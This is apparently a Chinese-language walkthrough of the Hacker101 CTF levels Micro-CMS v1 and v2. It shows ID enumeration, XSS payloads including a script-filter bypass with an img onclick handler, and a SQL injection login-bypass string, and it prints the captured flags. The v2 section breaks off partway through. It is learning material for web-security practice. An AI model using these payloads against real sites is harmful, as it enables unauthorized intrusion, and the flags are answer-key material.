网址：
ctf.hacker101.com

关卡：
一、Micro-CMS v1
（1）信息收集：
打开发现是个markdown管理系统。
可以创建markdown文件。可以发现这些文件前缀都是:
http://35.196.135.216:5001/795706216d/page/
通过最后的数字判断文件在哪个页面.可进行注入尝试。

而且发现网站中只能看到1,2
新创建的网页为6证明有东西被隐藏或者删除了。

发现还有几个动作,分别是：
page,edit,create

（2）针对已知点进行攻击：
从弱到难：

先查看是否有隐藏信息:
输入3，4时都是400，而输入4时是403，代表4可能有问题:

http://35.196.135.216:5001/795706216d/page/4

试试其他动作看下，只有edit可试，尝试：
http://35.196.135.216:5001/795706216d/page/edit/4

真的发现了secret
My secret is 
```
^FLAG^a1fe3f4dbf0af943e60cccfd46d5a29bba3fea553f653f77a612a9b5606c2004$FLAG$
```

由于没有下一步提示，继续按照刚才的信息收集做：
尝试sql注入
对于page页面，
','%23,and 1均错误

再尝试edit页面，
加'里面出现flag:
http://35.196.135.216:5001/795706216d/page/edit/1'
证明这里不是有sql注入，而是出题人故意而为
^FLAG^e17cd93321a1c635890ed50fc48aa1e2334a10e01b5a8c9686448834a057ef7f$FLAG$

现在好像没思路了，再想想刚刚的信息收集，
edit,page,create
联想edit和create都有输入框，
尝试标题处edit xss:
<script>alert('1')</script>

^FLAG^ae1ef3b7de7e4d4e0b03e016783a7b1e3f8e7d6de33e481933a76476189cf189$FLAG$

发现create也同样的可以xss，

尝试内容处xss，
测试发现显示内容时<script>标签被过滤了。
此处怀疑点，接下来想办法绕xss。发现script标签被过滤了，

尝试用img
<img src="666" onclick="alert('1')"/>
查看源码发现flag:
flag="^FLAG^06a584e35f473b43e63cbe6da1fa8c2a84c4f938e3ca9b51251a52e5e5f218cf$FLAG$"

二、Micro-CMS v2

（1）信息收集
动作:
edit,page,create,login

发现不登录可以使用page操作
登录后才能edit,create
而且根据cms内公告信息可以看出用户名为admin

登录出可能有问题
(2)开始攻击

登录出尝试：
正常输入：admin Unknown user
万能密码：admin' or 1=1 or '1'='1 Invalid password

尝试登录语句是:

select from table_name where username=""
$row["password"]==$_POST["password"]